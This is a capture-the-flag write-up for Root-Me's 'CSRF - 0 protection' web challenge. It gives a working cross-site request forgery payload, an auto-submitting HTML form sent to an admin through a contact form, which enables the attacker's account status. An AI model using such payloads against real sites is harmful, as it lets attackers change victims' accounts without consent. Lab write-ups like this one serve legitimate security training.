## Challenge name: CSRF - 0 protection

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Client/CSRF-0-protection](https://www.root-me.org/en/Challenges/Web-Client/CSRF-0-protection)

**Register and login to the website. The Profile tab has a form to update user info with a disabled Status checkbox. The Contact tab sends messages that the admin reviews.**

**Create a CSRF payload that mimics the profile form update with the status checkbox enabled:**
```html
<form id="attack" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="your_username">
<input type="checkbox" name="status" checked>
</form>
<script>document.getElementById("attack").submit();</script>
```

**Submit this HTML in the Contact form. When the admin views the message, the script auto-submits the form and enables your status. Check the Private tab to get the flag.**

**Use the captured flag/password to validate the challenge.**

**Thankyou.**
